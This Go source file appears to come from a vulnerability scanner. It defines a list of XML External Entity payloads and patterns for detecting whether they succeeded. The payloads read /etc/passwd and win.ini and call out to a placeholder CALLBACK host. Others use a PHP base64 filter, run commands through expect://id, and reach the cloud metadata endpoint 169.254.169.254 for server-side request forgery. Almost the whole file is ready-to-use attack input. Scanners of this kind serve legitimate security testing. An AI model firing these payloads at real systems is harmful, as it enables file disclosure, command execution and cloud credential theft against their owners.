package payloads

// XXEPayloads contains XML External Entity payloads
var XXEPayloads = []string{
	// Basic file disclosure
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,

	// OOB XXE
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK/xxe">]><foo>&xxe;</foo>`,

	// Parameter entity
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CALLBACK/xxe.dtd">%xxe;]><foo>test</foo>`,

	// Error-based XXE
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>`,

	// PHP wrapper
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,

	// Expect wrapper
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,

	// SSRF via XXE
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
}

// XXESuccessIndicators contains patterns that indicate successful XXE
var XXESuccessIndicators = []struct {
	Pattern     string
	Description string
}{
	{"root:x:0:0:", "XXE file disclosure: /etc/passwd contents leaked"},
	{"[extensions]", "XXE file disclosure: Windows win.ini contents leaked"},
	{"[boot loader]", "XXE file disclosure: Windows boot.ini contents leaked"},
	{"<?php", "XXE file disclosure: PHP source code leaked"},
	{"PD9waHA", "XXE with PHP filter: base64-encoded PHP source"},
	{"uid=", "XXE command execution via expect://"},
}

// XXEErrorIndicators contains patterns that indicate XXE processing
var XXEErrorIndicators = []string{
	"SYSTEM",
	"ENTITY",
	"DOCTYPE",
	"failed to load external entity",
	"External entity",
	"parser error",
	"xmlParseEntityRef",
	"Start tag expected",
}

// GetXXEPayloads returns XXE payloads, optionally filtered by type
func GetXXEPayloads(payloadType string) []string {
	if payloadType == "" {
		return XXEPayloads
	}

	var filtered []string
	for _, payload := range XXEPayloads {
		switch payloadType {
		case "file":
			if containsString(payload, "file://") {
				filtered = append(filtered, payload)
			}
		case "oob":
			if containsString(payload, "http://") && containsString(payload, "CALLBACK") {
				filtered = append(filtered, payload)
			}
		case "error":
			if containsString(payload, "nonexistent") {
				filtered = append(filtered, payload)
			}
		}
	}
	return filtered
}

func containsString(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsSubstring(s, substr))
}

func containsSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
